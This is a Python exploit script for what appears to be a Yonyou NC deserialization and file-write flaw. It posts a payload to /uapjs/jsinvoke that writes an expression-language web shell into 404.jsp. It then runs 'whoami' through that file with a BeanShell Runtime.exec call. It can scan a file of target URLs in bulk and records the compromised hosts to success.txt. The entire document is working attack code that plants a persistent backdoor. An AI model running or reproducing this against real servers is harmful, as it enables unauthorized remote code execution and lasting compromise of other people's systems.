import argparse
import logging

import requests

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)


def perform_exploit(target_url):
    path_1 = "/uapjs/jsinvoke?action=invoke"
    path_2 = "/404.jsp?error=bsh.Interpreter"

    payload_1 = {
        "serviceName": "nc.itf.iufo.IBaseSPService",
        "methodName": "saveXStreamConfig",
        "parameterTypes": [
            "java.lang.Object",
            "java.lang.String"
        ],
        "parameters": [
            "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
            "webapps/nc_web/404.jsp"
        ]
    }
    payload_2 = {
        'cmd': 'org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())',
    }

    try:
        response = requests.get(target_url, timeout=5, verify=False)
        if response.status_code == 200:
            response_1 = requests.post(url=f"{target_url}{path_1}", json=payload_1, timeout=5)
            if response_1.status_code in [200, 404]:
                response_2 = requests.post(url=f"{target_url}{path_2}", data=payload_2, timeout=5)
                if "<?xml version='1.0' encoding='UTF-8'?>" in response_2.text:
                    return True
    except Exception as e:
        pass

    return False


def main():
    parser = argparse.ArgumentParser(description="Script for exploiting vulnerabilities.")
    parser.add_argument('-f', type=str, default=None, required=False, help='Input file path')
    parser.add_argument('-u', type=str, default=None, required=False, help='Input URL')
    args = parser.parse_args()

    if not args.f and not args.u:
        parser.print_help()
        return

    target_urls = []
    if args.f:
        with open(args.f, 'r') as f:
            lines = f.readlines()
            target_urls = [line.strip() for line in lines if not line.startswith('https')]
    elif args.u:
        target_urls.append(args.u)

    success_targets = []
    logger.info("[+]任务开始.....")
    for url in target_urls:
        if perform_exploit(url):
            success_targets.append(url)
            logger.info(f"\033[32;1m[+] success {url}\033[0m")
        else:
            logger.info(f"\033[1;34m[*] fail {url}\033[0m")

    logger.info("任务完成.")
    with open('success.txt', 'w') as f:
        for target in success_targets:
            f.write(target + '\n')


if __name__ == "__main__":
    main()
